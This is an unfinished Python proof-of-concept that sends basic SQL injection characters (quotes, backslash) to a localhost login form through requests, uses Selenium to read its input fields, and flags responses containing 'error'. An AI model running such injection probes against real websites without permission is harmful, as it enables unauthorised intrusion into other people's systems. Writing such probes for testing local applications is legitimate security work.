###POC for SQL attacking###
    #Query form with selenium 
    #Load payload 
    #fill form with payload
    #get the response (Universal)

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.common.exceptions import (StaleElementReferenceException,
                                       TimeoutException,
                                       UnexpectedAlertPresentException,
                                       NoSuchFrameException,
                                       NoAlertPresentException,
                                       WebDriverException,
                                       InvalidElementStateException
                                       )


from urllib.parse import urlparse, urljoin


import time
import random
import traceback
import os 
import pprint
import json
import string
import re
import requests

driver = webdriver.Chrome()


class SQL:
    def __init__(self,driver,url):
        self.driver = driver
        self.url = url
        
        
    #get from with Selenium  or javascipt?
    def get_form(self):
        self.driver.get(self.url)
        elements = self.driver.find_elements(By.TAG_NAME, 'input')   #find xpath form
        for e in elements:
            print(e.text)
            
            
    ###TODO###
    # collect and save node + edge
    def attack(self):
        print('Begining attack the website '+(self.url))
        # if get method == post:
        #query the form with Selenium 
        #attack with headless 
            #wako == username, password
            #universal detection
        payloads = self.get_sql_payload()
        result_payload =[]
        
        for payload in payloads:
            r = requests.post(self.url, data={'username':payload, 'password':''} )
            if (re.search('error',r.text)):
                result_payload.append(payload)
                print(r.text)
                break
        print("First attack vector ->" + str(result_payload))
        
    def get_sql_payload(self):  #reference sql payload https://github.com/payloadbox/sql-injection-payload-list need to add more
        sql_payloads = ['\\',
                        '\'',
                        '\"',
                        '\,'
                        ]
        return sql_payloads
    
    def response(self,s_text, r_text):  #s_text : search text, r_text = result text
        self.s_text = s_text
        self.r_text = r_text
        ##add response 
        #return re.search()
        pass

if __name__ == "__main__":
    #sql = SQL('http://localhost:8090/users/login.php').attack()
    
    SQL(driver,'http://localhost:8090/users/login.php').get_form()



    

